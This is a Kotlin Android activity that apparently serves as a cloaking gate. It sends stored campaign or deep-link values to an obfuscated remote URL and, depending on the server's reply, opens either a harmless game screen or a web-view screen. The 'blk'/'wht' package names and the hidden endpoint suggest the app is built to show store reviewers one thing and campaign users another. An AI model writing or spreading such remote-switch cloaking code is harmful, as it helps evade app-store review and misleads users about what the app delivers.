package com.dreampl.blk

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.dreampl.R
import com.dreampl.blk.STN.C1
import com.dreampl.blk.STN.D1
import com.dreampl.blk.STN.DEV
import com.dreampl.wht.Game
import com.dreampl.wht.StartAct
import com.orhanobut.hawk.Hawk
import kotlinx.android.synthetic.main.activity_filter.*
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class Filter : AppCompatActivity() {
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_filter)

        jsoup = ""

        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = coroutineTask()
            Log.d("jsoup status from global scope", jsoup)
        }

        runBlocking {
            try {
                job.join()

                Log.d("jsoup status out of global scope", jsoup)
                txtMain.text = jsoup

                if (jsoup == STN.jsoupCheck) {
                    Intent(applicationContext, StartAct::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, WEB::class.java).also { startActivity(it) }
                }
                finish()
            } catch (e: Exception) {

            }
        }

    }

    private suspend fun coroutineTask(): String {
        val hawk: String? = Hawk.get(C1, "null")
        val hawkAppLink: String? = Hawk.get(D1, "null")
        val hawkDevOrNot: String? = Hawk.get(DEV, "false")


        //added devModeCheck
        val forJsoupSetNaming: String = STN.lru + STN.odone + hawk + "&" + STN.twoSub + hawkDevOrNot
        val forJsoupSetAppLnk: String = STN.lru + STN.odone + hawkAppLink + "&" +  STN.twoSub + hawkDevOrNot

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (hawk != "null") {
                getCodeFromUrl(forJsoupSetNaming)
                Log.d("Check1C", forJsoupSetNaming)
            } else {
                getCodeFromUrl(forJsoupSetAppLnk)
                Log.d("Check1C", forJsoupSetAppLnk)
            }
        }
        return jsoup
    }

    private fun getCodeFromUrl(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                Log.d("jsoup status inside Url function", text)
                jsoup = text
            } else {
                Log.d("jsoup status inside Url function", "is null")
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
}